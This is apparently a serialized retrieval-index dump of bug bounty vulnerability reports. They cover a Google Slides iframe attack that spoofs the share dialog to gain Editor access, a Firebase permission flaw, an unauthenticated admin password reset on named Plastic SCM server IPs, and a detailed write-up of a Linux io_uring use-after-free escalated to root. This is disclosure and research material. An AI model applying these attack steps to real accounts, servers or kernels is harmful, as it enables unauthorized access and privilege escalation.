"20250408_175640_393408.clean.txt", "file_type": "text/plain", "file_size": 6861, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "b5f7de19e5c56e68d3fd945fbf0650eb109407bbe93c141e059546d83b23ba3d", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "We need a\r\nredirect instead. For this we can use an old Docs URLs format designed for Google Workspaces:\r\ndocs.google.com/a/example.org/file...\r\n. This URL format is no longer used, so Docs redirects us to the same URL with the\r\n/a/...\r\npart removed, making the file page happy.\r\nSpoofing the dialog\r\nWe can combine all of the previous concepts to add the share dialog to our presentation, but it's still fairly obvious to the user what clicking \"Send\" will do.\r\nWe can however use the same redirect trick to overlay other content on the same slide to mask the dialog. Docs has many features/services we can iframe, I chose\r\n/htmlpresent\r\nfor my demo but there are probably better ways to do it.\r\nIt's also possible to just move the share dialog to the top left of the screen so that only the Send button is visible without having to cover anything up.\r\nWe can also add a slow fade transition to give the iframes more time to load and hide the share dialog pop-up animation.\r\nDelivery\r\nThe attack can be delivered either via the\r\n/present\r\npage, or a share to web URL. In my demo I used the share to web feature, and set it to automatically advance to the next slide after 1ms to play the fade transition without requiring a user-gesture.\r\nBonus\r\nWhile this report demonstrates a specific attack, I believe that iframing of any docs.google.com page as self-origin, and any Google page that allows Docs to frame it, could lead to other vulnerabilities and attack vectors.\r\nFor example, an attacker can load multiple Docs picker URLs for various Google services (eg Docs, Photos, Drive) in layered (hidden) iframes, and then trick the target into pressing CTRL+P and saving a PDF of it all. Such an attack is rather powerful and requires no previous knowledge (no need to know IDs) but is a bit harder to pull off (social engineering wise).\r\nAnother possibility is loading a vulnerable frame with specific query parameters to reach XSS. I was not able to find such a frame and params combination in my research, but there is\r\na lot\r\nof attack surface out there since a lot of JS/gapi widgets allow framing on docs.google.com.\r\nRepro\r\nTo set up a basic version of this attack:\r\nEdit the\r\nscript to include the targeted file/folder ID in\r\nTARGET_ID\r\n, and your (attacker's) e-mail in\r\nTARGET_EMAIL\r\n. Run the script and keep note of the URL following \"Embed with:\" in the output.\r\nCreate a new Google Slides presentation and add any YouTube video.\r\nSet the video to start automatically, and muted.\r\nDuplicate the video and use a HTTP proxy to change the video ID to the URL from step 1.\r\n(optional) Follow the same process with the script edited for other URLs to cover up the Share dialog and spoof it.\r\nPublish the presentation to web and send the URL to the target. Once they click the \"Send\" button you'll gain\r\nEditor\r\naccess to the file/folder at the ID.\r\nI've included a\r\nsetup.webm\r\nvideo that goes through the above steps, as well as a\r\ndemo.webm\r\nvideo that just shows an example of what an actual attack with spoofing could look like.\r\nI'd love to share my research with the world once the vulnerability is patched, either on\r\nmy blog\r\nor as a YouTube video. Feel free to let me know if you have any thoughts or questions around that.\r\nAttack scenario\r\nThis vulnerability can be used by an attacker who knows the ID (or URL) of a private\r\nGoogle Drive folder\r\n,\r\nfile\r\n, or\r\nGoogle Docs document\r\nThe attacker has to convince the target to open a crafted\r\nlink and click on a button labeled \"Send\" on it. The attacker has a lot of control over how the button is presented and can convincingly mask/spoof it.\r\nThe attacker gains read/write (\"Editor\") access to the targeted folder, file, or document.", "mimetype": "text/plain", "start_char_idx": 3155, "end_char_idx": 6861, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "4b075f27-9f83-4e90-9fcf-3e3e44a78c02": {"__data__": {"id_": "4b075f27-9f83-4e90-9fcf-3e3e44a78c02", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_582730.clean.txt", "file_name": "20250408_175649_582730.clean.txt", "file_type": "text/plain", "file_size": 913, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "eb5589dd-06bc-4f44-bcb0-ce6dcf7208f0", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_582730.clean.txt", "file_name": "20250408_175649_582730.clean.txt", "file_type": "text/plain", "file_size": 913, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "ae04ef65a3c7f8ca08d0506a41c4e9e2cd83b929f11013bacef67d25de588396", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\n'Firebase Admin' is able to modify the 'Test Lab'.\r\nProduct:\r\nhttps://console.firebase.google.com/\r\nURL:\r\nhttps://console.firebase.google.com/project/project_id/testlab/histories\r\nVulnerability type:\r\nOther\r\nDetails\r\nSteps to reproduce:\r\nVisit on browser: \u2018\r\nhttps://console.firebase.google.com/project/project_id/settings/iam'\r\nand login to your \u2018Account-1\u2019.\r\nNow add your \u2018Account-2\u2019 as 'Firebase Admin'.\r\nThen visit on another browser: '\r\nhttps://console.firebase.google.com/project/project_id/testlab/histories'\r\nand login to your \u2018Account-2\u2019.\r\nNow you see 'Test Lab'.\r\nNow you able to view and modify the 'Test Lab' data.\r\nAttack scenario\r\n'Firebase Admin can make changes to: All Firebase products except Test Lab', but due to the issue a 'Firebase Admin' is able to view and modify the 'Test Lab' data. So, it is an issue because it is beyond the permission of the 'Firebase Admin'.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 899, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "cff0fd30-21c0-404d-8f6e-de7aaed22018": {"__data__": {"id_": "cff0fd30-21c0-404d-8f6e-de7aaed22018", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_376030.clean.txt", "file_name": "20250408_175717_376030.clean.txt", "file_type": "text/plain", "file_size": 1662, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "5c464e1e-806d-4ed5-ab14-9e16cffc013c", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_376030.clean.txt", "file_name": "20250408_175717_376030.clean.txt", "file_type": "text/plain", "file_size": 1662, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "05340cbbb5d2f90b0f38427ea066cee4bcf2176c29f83ecd40e166b018d42f64", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Plastic SCM Server access by Resetting administrator password.\r\nDescription: Plastic SCM  is a cross-platform commercial distributed version control tool developed by C\u00f3dice Software Inc. It is available for Microsoft Windows, Mac OS X, Linux, and other operating systems. It includes a command-line tool, native GUIs, diff and merge tool and integration with a number of IDEs. It is a full version control stack not based on Git (although it can communicate with it).\r\nSteps to reproduce:\r\nGo to\r\nhttps://35.244.187.233/account\r\nor\r\nhttps://35.190.11.91/account\r\nin Chrome browser and you can see that its common name is pointing to owlchemylabs.com\r\nNow it asks for password for login, we dont have password for login, now as an attacker i will change administrator password, now change url to\r\nhttps://35.190.11.91/account/register\r\nhttps://35.244.187.233/account/register\r\nNow give new password on both password fields and You will get access to internal dashboard of server configuration of plastic scm\r\nBrowser/OS:\r\nWindows 10 Chrome Version 90.0.4430.212 (Official Build) (64-bit)\r\nProof of Concept : See the below video\r\nhttps://drive.google.com/file/d/1DV61OdzSp7i74-JvPBjr0FT0cWHcJUY5/view?usp=sharing\r\nAttack scenario:\r\nAny unauthenticated users can change password for administrator user and he get access to server configuration, By that attacker will get database creds in the storage section and attacker can add users delete all users and change password of all users and he will get IP adresses of all users in that server etc.\r\nAcquisition info:\r\nIt was acquired by Google on May 10th 2017\r\nhttps://en.wikipedia.org/wiki/Owlchemy_Labs", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1661, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "10cce85a-ea7c-403e-9279-e8e77ba7d62c": {"__data__": {"id_": "10cce85a-ea7c-403e-9279-e8e77ba7d62c", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.clean.txt", "file_name": "20250408_175701_150694.clean.txt", "file_type": "text/plain", "file_size": 13302, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "2396d5cb-1cff-475b-875d-7303607f2216", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.clean.txt", "file_name": "20250408_175701_150694.clean.txt", "file_type": "text/plain", "file_size": 13302, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "08b2e41711d5d9b9feb0f53b16dcf1e929f47c8ff42b356450ad600f551029c5", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "4a23a0d7-51b4-452e-9823-28846bd05566", "node_type": "1", "metadata": {}, "hash": "c56442b138c3b8e386d4fd6572c581d7207a12c0a54ad9545a2c5accc9225e3a", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: kCTF exploit #23 & #24 - exp23_David & exp24_David (CVE-2022-2602, 5.10+5.19, io_uring registered file GC UAF)\r\n5.10 submission:\r\nhttps://drive.google.com/open?id=15RnqvCDcMmiHy0AmlCXXS4JzRuQaWB4E\r\n5.19 submission:\r\nhttps://drive.google.com/open?id=1OTXiTq8D8yxkhUSfZghpwJ6aCBp7ycHi\r\nexploit for COS linux, v5.10.123+, 11th of september 2022\r\nby: [REDACTED_NAME]\r\nio_uring instances can hold so-called \"fixed files\" internally, which subsequent requests can use.\r\nyou can register a bunch of them with io_uring_register and IO_URING_REGISTER_FILES.\r\nthis functionality poses a problem, because you can now create file reference loops.\r\nAF_UNIX sockets also have this functionality (through SCM_RIGHTS), and they use\r\na garbage collection algorithm that can resolve these cycles and properly free the resources.\r\nio_uring lifts off of this garbage collector (GC), by internally registering a AF_UNIX socket\r\nand additionally keeping all these fixed files in its socket buffers, instead of only in\r\nits fixed file buffer (which is the only reasonable way to access the files performantly).\r\nyou can read more about the workings of the unix socket GC here:\r\n-\r\nhttps://lwn.net/Articles/779472/\r\nhttps://googleprojectzero.blogspot.com/2022/08/the-quantum-state-of-linux-kernel.html\r\nthe bug is that even if a file is garbage-eligible, it can still be in use, through an asynchro-\r\nnous io_uring request. in this case, the file will get freed, because for the GC, the file is in a\r\nreference cycle and therefore it needs to be dealt with. the use-after-free condition can be reached\r\nin two ways: either a prepared request has already set its\r\nfile\r\nfield to the \"victim\" file, but is\r\nnot executing yet, OR a file is dynamically taken from the fixed file table when the request is executing.\r\nthe latter only applies to requests that use several files, like IORING_OP_TEE and IORING_OP_SPLICE.\r\nfor this exploit, the\r\nunix_scm_cycle_create\r\nfunction contains the logic for creating such a reference\r\ncycle. it contains comments that are useful for understanding the bug better.\r\nnote that the io_uring instance must necessarily not be reachable from userspace anymore before the GC\r\ncan trigger (it is not a reference cycle otherwise). however, we can queue up an semi-arbitrary amount\r\nof requests that will still be executed anyhow, only limited by RLIMIT_MEMLOCK.\r\nwe can (ab)use so-called \"linked requests\", requests that will execute in a serialized manner.\r\nthat is to say, if we have A linked with B, B will only execute once A has finished. by having request A\r\nblock on a pipe/socket, we can dictate exactly when request B will get executed. if B happens\r\nto be configured to operate on a fixed file we freed with the bug, this translates\r\nto an UAF that can get triggered whenever we want! we can create long sequences of linked requests,\r\ncalled \"chains\", but if you have multiple chains queued, they will still execute concurrently.\r\nby using the blocking sequence trick above, we can create a chain that alternates between\r\na blocking operation and an operation that acts on the victim object. you can see the latter\r\nas a custom \"instruction\" for a weird machine, and writing to the former is akin to incrementing\r\nthe instruction pointer :p\r\nwe're going to have to constantly rewrite the victim object, and with existing primitives this\r\nmeans a lot of reallocation, a lot of allocator races and a lot of bad stuff. therefore, i've\r\ndeveloped a new technique, one i would like to kindly nominate for the \"novel technique\" VRP bonus.\r\nafter releasing the pages of the victim object's slab back to the page allocator using standard techniques,\r\nwe can reallocate them as io_uring rings/sqes. these can be mapped to userspace directly, which means that\r\nyou have \"live\" access to the freed victim file! in our case, the order of the file slab is 1 (so 2 pages),\r\nbut the technique can be used for objects of any size.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3934, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "4a23a0d7-51b4-452e-9823-28846bd05566": {"__data__": {"id_": "4a23a0d7-51b4-452e-9823-28846bd05566", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.clean.txt", "file_name": "20250408_175701_150694.clean.txt", "file_type": "text/plain", "file_size": 13302, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "2396d5cb-1cff-475b-875d-7303607f2216", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.clean.txt", "file_name": "20250408_175701_150694.clean.txt", "file_type": "text/plain", "file_size": 13302, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "08b2e41711d5d9b9feb0f53b16dcf1e929f47c8ff42b356450ad600f551029c5", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "10cce85a-ea7c-403e-9279-e8e77ba7d62c", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.clean.txt", "file_name": "20250408_175701_150694.clean.txt", "file_type": "text/plain", "file_size": 13302, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "43de77ccdca1c77e43d432ecf212563067eef97978853032936bbb1edab241f6", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "fc9f9e2f-b318-4eac-a723-4074e5122716", "node_type": "1", "metadata": {}, "hash": "e0aafd5553b8b049bb9db12a3eb49497324d18cf1647c6ea9db75ce053f5152a", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "you can see the latter\r\nas a custom \"instruction\" for a weird machine, and writing to the former is akin to incrementing\r\nthe instruction pointer :p\r\nwe're going to have to constantly rewrite the victim object, and with existing primitives this\r\nmeans a lot of reallocation, a lot of allocator races and a lot of bad stuff. therefore, i've\r\ndeveloped a new technique, one i would like to kindly nominate for the \"novel technique\" VRP bonus.\r\nafter releasing the pages of the victim object's slab back to the page allocator using standard techniques,\r\nwe can reallocate them as io_uring rings/sqes. these can be mapped to userspace directly, which means that\r\nyou have \"live\" access to the freed victim file! in our case, the order of the file slab is 1 (so 2 pages),\r\nbut the technique can be used for objects of any size.\r\nrelevant code in io_uring.c:\r\n8081    static void *io_mem_alloc(size_t size)\r\n8082    {\r\n8083        gfp_t gfp_flags = GFP_KERNEL | __GFP_ZERO | __GFP_NOWARN | __GFP_COMP |\r\n8084        __GFP_NORETRY;\r\n8085\r\n8086        return (void *) __get_free_pages(gfp_flags, get_order(size));\r\n8087    }\r\n----\r\n9255    static int io_allocate_scq_urings(struct io_ring_ctx *ctx,\r\n9256            struct io_uring_params *p)\r\n9257    {\r\n9258        struct io_rings *rings;\r\n9259        size_t size, sq_array_offset;\r\n9260\r\n9261        // make sure these are sane, as we already accounted them\r\n9262        ctx->sq_entries = p->sq_entries;\r\n9263        ctx->cq_entries = p->cq_entries;\r\n9265\r\n9264        size = rings_size(p->sq_entries, p->cq_entries, &sq_array_offset);\r\n9265        if (size == SIZE_MAX)\r\n9266            return -EOVERFLOW;\r\n9267\r\n9268        r\u0333i\u0333n\u0333g\u0333s\u0333 \u0333=\u0333 \u0333i\u0333o\u0333_\u0333m\u0333e\u0333m\u0333_\u0333a\u0333l\u0333l\u0333o\u0333c\u0333(\u0333s\u0333i\u0333z\u0333e\u0333)\u0333;\u0333\r\n9269        if (!rings)\r\n9270            return -ENOMEM;\r\n9271\r\n9272        ctx->rings = rings;\r\n....        [...]\r\n9282        size = array_size(sizeof(struct io_uring_sqe), p->sq_entries);\r\n9283        if (size == SIZE_MAX) {\r\n9284            io_mem_free(ctx->rings);\r\n9285            ctx->rings = NULL;\r\n9286            return -EOVERFLOW;\r\n9287        }\r\n9288\r\n9289        c\u0333t\u0333x\u0333-\u0333>\u0333s\u0333q\u0333_\u0333s\u0333q\u0333e\u0333s\u0333 \u0333=\u0333 \u0333i\u0333o\u0333_\u0333m\u0333e\u0333m\u0333_\u0333a\u0333l\u0333l\u0333o\u0333c\u0333(\u0333s\u0333i\u0333z\u0333e\u0333)\u0333;\u0333\r\n9290        if (!ctx->sq_sqes) {\r\n9291            io_mem_free(ctx->rings);\r\n9292            ctx->rings = NULL;\r\n9293            return -ENOMEM;\r\n9294        }\r\n9295\r\n9296        return 0;\r\n9297    }\r\nctx->rings and ctx->sq_sqes can then be readily allocated by calling\r\nmmap on the file descriptor returned by io_uring_setup.\r\nto my knowledge, this method has not been publicly published before.\r\nthere's some very nice benefits:\r\nsince this is exactly the slab that the file laid on, we don't have to deal with alignment issues.\r\nyou can take a forged object, project it along the shared memory, and be sure that your forged fields\r\nare at the offsets you want them to. additionally, there's no object headers that can pollute the\r\nvictim's state (and force a crash.)\r\nyou don't have to deal with allocator races. every time you reallocate,\r\nthere is a chance another allocation in the same slab will snatch the victim object away, which will\r\nlikely cause a crash, or otherwise requires you to re-trigger the vulnerability. this issue very prevalent\r\nif the target is running production workloads.", "mimetype": "text/plain", "start_char_idx": 3112, "end_char_idx": 6384, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "fc9f9e2f-b318-4eac-a723-4074e5122716": {"__data__": {"id_": "fc9f9e2f-b318-4eac-a723-4074e5122716", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.clean.txt", "file_name": "20250408_175701_150694.clean.txt", "file_type": "text/plain", "file_size": 13302, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "2396d5cb-1cff-475b-875d-7303607f2216", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.clean.txt", "file_name": "20250408_175701_150694.clean.txt", "file_type": "text/plain", "file_size": 13302, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "08b2e41711d5d9b9feb0f53b16dcf1e929f47c8ff42b356450ad600f551029c5", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "4a23a0d7-51b4-452e-9823-28846bd05566", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.clean.txt", "file_name": "20250408_175701_150694.clean.txt", "file_type": "text/plain", "file_size": 13302, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "b54e8010d88246e50cbb5b6b3001f60434e11f1e077799a4cfa998323ed9464d", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "8baa4512-191f-4d12-9983-c368384a6dc4", "node_type": "1", "metadata": {}, "hash": "10c0d6617f3b654daf1c82e14bac9fce8faf062349d8dfd8f1b1fe2a48828a74", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "to my knowledge, this method has not been publicly published before.\r\nthere's some very nice benefits:\r\nsince this is exactly the slab that the file laid on, we don't have to deal with alignment issues.\r\nyou can take a forged object, project it along the shared memory, and be sure that your forged fields\r\nare at the offsets you want them to. additionally, there's no object headers that can pollute the\r\nvictim's state (and force a crash.)\r\nyou don't have to deal with allocator races. every time you reallocate,\r\nthere is a chance another allocation in the same slab will snatch the victim object away, which will\r\nlikely cause a crash, or otherwise requires you to re-trigger the vulnerability. this issue very prevalent\r\nif the target is running production workloads. the fact that the memory comes directly from the page allocator\r\nis also relevant here, because if multiple free pages are on the page allocator freelist, you would have to\r\nspray many more slab objects than pages, comparatively, which translates to more races.\r\nit is semi-practical to inject TOCTOU-type bugs in code that uses the victim object, because you can alter\r\nthe state of the forged object in real time. this can be useful in niche situations to force further memory\r\ncorruption.\r\nalso note that the primitive does not require special privileges. the implementation is simple, it can be found\r\nin the section labeled \"uring_spray.c\"\r\nif had not used this primitive, i would have had to first re-trigger the vulnerability numerous times to ensure\r\nthat freed file properly aligned with my spray and hope that previous attempts did not cause a crash. once successful,\r\ni would have had to reallocate the correct object some 250+ times successfully without a single allocator race occuring.\r\nall of this would drastically decrease the reliability of the exploit (which now has an acceptable baseline reliability\r\nof around 80-90% on my machine)\r\n--\r\nPROBE STAGE:\r\nback to the exploit, we've already queued up a chain that starts on a blocking operation, and an IORING_OP_SPLICE\r\nrequest (S) that will read from a pipe end and write to the victim fixed file, which has been freed.\r\nR is soft-linked with IOSQE_LINK, which means that it will only execute if S succeeds (i.e. does not return an error.)\r\nafter spraying a few pages with the io_uring spray primitive, we also allocate numerous memfd files. we make sure to project\r\na forged file with ->flags & FMODE_WRITE == 0 to the ring buffers. then we execute S by unblocking its link.\r\nif for some reason our cross-cache attempt failed, and we could not reallocate the victim slab as the shared memory,\r\nthe victim object could surely be reallocated as another file, which would likely be one of our memfds.\r\nthis adds an useful diagnostic: if we lseek all of the memfds, and one of its positions is NOT 0, this means\r\nthat it was reallocated at the address of the victim object, and therefore the cross-cache attempt failed.\r\nif it succeeded however, it would error early, because we forged the new object to not be writable. erroring\r\nearly is essential, because otherwise we cannot forge the necessary state to not crash.\r\nKERNEL LEAK STAGE:\r\nok, we probably have full control over the freed file now. sadly, there's no easy way to get a kernel leak.\r\ni had to come up with a pretty contrived bruteforce method. also, note how at this point we cannot submit\r\nnew requests, all of them have to be queued up in advance. additionally cannot look at results, because we had\r\nto unmap the CQ ring to trigger the bug.\r\nthe IORING_OP_RECV and IORING_OP_RECVMSG operations require a valid socket file to operate, and will fail otherwise.\r\nthis is determined by checking if file->f_op == &socket_file_operations - a kernel pointer. by queueing up 256 separate\r\nIORING_OP_RECVMSG requests R_i, separated by a blocking request, we can keep changing the file's f_op field until it matches\r\n&socket_file_operations. sadly, we don't have enough information to forge a file that can make the request succeed - if\r\nwe could do this, we could soft-link (IOSQE_LINK) a next request that would only run when the attempt succeeded, and thereby\r\ndetermine which byte the base kernel address is randomized with. RIP, it would have been a nice technique.\r\nio_uring's provided buffers (IORING_OP_PROVIDE_BUFFERS) are the saving grace.", "mimetype": "text/plain", "start_char_idx": 5612, "end_char_idx": 9958, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "8baa4512-191f-4d12-9983-c368384a6dc4": {"__data__": {"id_": "8baa4512-191f-4d12-9983-c368384a6dc4", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.clean.txt", "file_name": "20250408_175701_150694.clean.txt", "file_type": "text/plain", "file_size": 13302, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "2396d5cb-1cff-475b-875d-7303607f2216", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.clean.txt", "file_name": "20250408_175701_150694.clean.txt", "file_type": "text/plain", "file_size": 13302, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "08b2e41711d5d9b9feb0f53b16dcf1e929f47c8ff42b356450ad600f551029c5", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "fc9f9e2f-b318-4eac-a723-4074e5122716", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.clean.txt", "file_name": "20250408_175701_150694.clean.txt", "file_type": "text/plain", "file_size": 13302, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "d19dde0faef2131e3de02da0987c8c0fff1b47edb9e05adedcc35ea5024912fe", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "the IORING_OP_RECV and IORING_OP_RECVMSG operations require a valid socket file to operate, and will fail otherwise.\r\nthis is determined by checking if file->f_op == &socket_file_operations - a kernel pointer. by queueing up 256 separate\r\nIORING_OP_RECVMSG requests R_i, separated by a blocking request, we can keep changing the file's f_op field until it matches\r\n&socket_file_operations. sadly, we don't have enough information to forge a file that can make the request succeed - if\r\nwe could do this, we could soft-link (IOSQE_LINK) a next request that would only run when the attempt succeeded, and thereby\r\ndetermine which byte the base kernel address is randomized with. RIP, it would have been a nice technique.\r\nio_uring's provided buffers (IORING_OP_PROVIDE_BUFFERS) are the saving grace. you can submit these provided buffers,\r\nwhich are associated with a \"group id\", and then use this id with a IORING_OP_RECV(MSG) operation to select a buffer\r\ndynamically. these buffers can only be used once - they are removed from the table once they are looked up.\r\nchance has it that io_recvmsg will look up this buffer\r\nafter\r\nthe &socket_file_operations check, removing it from the table.\r\nby first providing 256 buffers group ids\r\ni\r\nfrom 0-255, and then adding an additional IORING_OP_RECV request\r\nafter R_\r\nthat reads to provided buffer\r\nfrom a socket, we know that if we execute the next \"instruction\"\r\nand something was written to the backing buffer of the provided buffer, our try did NOT equal &socket_file_operations.\r\none remaining question is how we can make io_recvmsg error without causing a crash - easy, in __sys_recvmsg_sock,\r\n!(file->f_private->ops->flags & PROTO_CMSG_DATA_ONLY) will make the operation error our early. if we got to\r\nthis point, our guess was necessarily correct, so in this case we\r\ncan\r\nforge f_private to point to something\r\nmeaningful that will satisfy this condition.\r\nthe stars aligned on this one - if we change the forged file to use a guessed byte x, execute the next \"instruction\"\r\nby unblocking the blocker, and did not register a value written to the user buffer, we know that x MUST necessarily be\r\nthe correct guess. essentially, we've programmed a side-channel address leak into our weird machine!\r\nRLIMIT_MEMLOCK of 64KiB prevented me from submitting long chains, so i used 16 separate chains, trying 16 candidates each.\r\nHEAP LEAK STAGE:\r\nany remaining \"operations\" can be done with a forged file that points to known memory, but not yet\r\ncontrolled\r\nmemory. without leaking the address of our controlled data (the shared mapping), we still don't really seem to have\r\nenough control to get the root shell. doing this is not that hard, but finding a sufficient gadget took some time.\r\nin the meantime, we also have 4 chains that each contains 16 \"instructions\" queued up, this time for IORING_OP_FADVISE,\r\nwhich will call file->f_op->fadvise(file, a, b, c) for us.\r\nin net/core/dev.c, we have the following:\r\n11156   static struct pernet_operations __net_initdata netdev_net_ops = {\r\n11157       .init = netdev_init,\r\n11158       .exit = netdev_exit\r\n11159   }\r\nwhere netdev_init will perform\r\nINIT_LIST_HEAD(&net->dev_base_head);\r\n.\r\nnet\r\nis the first argument, so a pointer\r\nto our forged file. we can set the forged f_op->f_advise to point to netdev_init, execute the \"instruction\"\r\nand then read the new pointer (to its own address) back again through the shared mapping. victory is coming close..\r\nthe address.\r\nPWN STAGE:\r\nwe can forge arbitrarily complex state now, seeing how we have 0x2000 bytes of controlled data at\r\nknown location to work with now. i found an arbitrary 32-bit write gadget (__io_commit_cqring), as well\r\nas an arbitrary 32-bit read gadget (bsg_get_command_q). we can forge f_op to point to our own buffer in such\r\na way that f_op->f_advise will point to these gadgets.\r\nthe last part is easy. i found a global reference chain to my own struct task_struct\r\n(unix_gc_inflight.prev, unix_sock->sock.sk_peer_pid->tasks[0]) and changed its\r\ncred and nsproxy to give me root privs.\r\nAttack scenario:\r\nn/a", "mimetype": "text/plain", "start_char_idx": 9161, "end_char_idx": 13241, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "94cf70f2-1867-4b85-afb9-f3a027c13f68": {"__data__": {"id_": "94cf70f2-1867-4b85-afb9-f3a027c13f68", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_372239.clean.txt", "file_name": "20250408_175710_372239.clean.txt", "file_type": "text/plain", "file_size": 718, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", 